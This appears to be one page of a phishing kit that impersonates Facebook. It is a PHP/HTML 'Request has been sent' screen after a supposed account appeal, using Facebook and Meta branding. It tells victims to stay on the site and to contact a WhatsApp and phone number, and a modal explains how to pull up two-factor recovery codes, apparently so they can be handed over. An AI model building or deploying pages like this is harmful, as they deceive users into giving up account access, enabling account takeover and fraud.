<?php


?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css"
        integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
<link rel="shortcut icon" href="./assets/img/fico.ico" type="image/x-icon">
<link rel="stylesheet" href="./assets/css/twofa.css">
<link href="./assets/css/boxicons.min.css" rel="stylesheet">
<style>
    body{
        background-color: #FFFFFF !important;
    }
    .box{
        border:none !important;
    }
    #fa2{
        width: 100% !important;
        height: 55px !important;
        outline: none !important;
        border-radius: 16px !important;
        padding: 16px !important;
    }
    .submit2fa{
        width: 100% !important;
        outline: none !important;
        border-radius: 16px !important;
        padding: 10px !important;
    }
    .submit2fa:disabled {
        opacity: 0.6 !important;
        cursor: not-allowed !important;
    }
</style>

    <title>Facebook</title>

</head>
<body>
<div class="navbar">
        <div class="container">
            <a href="/"><p><img src="./assets/img/fblogo.svg" class="logonav"></p></a>
            <div class="logout">
            <a href="#"><p>Log out</p></a>
        </div>

        </div>
</div>
<div class="mm">
<div class="box">

<div class="box_content" style="text-align: center;">
    <h4 style="font-size: 24px; margin-bottom: 24px;"><b>Request has been sent</b></h4>
    
    <img src="assets/img/done.jpg" alt="Request Sent" style="width: 280px; margin-bottom: 24px;">
    
    <p style="color: #65676b; margin: 0 auto 32px; max-width: 500px; line-height: 1.5;">
        Your request has been added to the processing queue. We will process your request within 1-2 hours. Please stay on this site for immediate updates about your appeal status.
    </p>

    <a href="https://wa.me/17634127808" style="text-decoration: none; display: block; margin-bottom: 16px;">
        <button style="background-color: #25D366; color: white; border: none; border-radius: 8px; padding: 12px 24px; width: 100%; font-size: 16px; display: flex; align-items: center; justify-content: center; gap: 8px;">
            <i class="bx bxl-whatsapp" style="font-size: 20px;"></i>
            Message on WhatsApp
        </button>
    </a>

    <p style="color: #65676b; font-size: 14px; margin-bottom: 32px;">
        or message us here: <span style="color: #1877f2;">+1 763-412-7808</span>
    </p>

    <img src="logo.png" alt="Meta" style="height: 24px;">
</div>
</div>

</div>
<!-- Modal -->
<div id="modal-container">
    <div id="modal">
      <h6>Didn't receive a code?</h6>
      <hr>
      <p>
        1. Go to <b>Settings > Security and Login.</b>
<br> <br>
2. Under the <b>Two-Factor Authentication</b> section, click <b>Use two-factor authentication.</b> You may need to re-enter your password.
<br><br>
3. Next to <b>Recovery Codes</b>, click <b>Setup</b> then <b>Get Codes.</b> If you've already set up recovery codes, you can click <b>Show Codes.</b>
<br><br>
<img src="./assets/img/recovery.gif" alt="" width="100%" height="auto">

      </p>
      <button id="close-modal" class="close-modal">Continue</button><br><br>
    </div>
  </div>
  
<script src="https://code.jquery.com/jquery-3.6.4.min.js" integrity="sha256-oP6HI9z1XaZNBrJURtCoUT5SUnxFr8s3BzRl+cbzUq8=" crossorigin="anonymous"></script>



</body>
</html>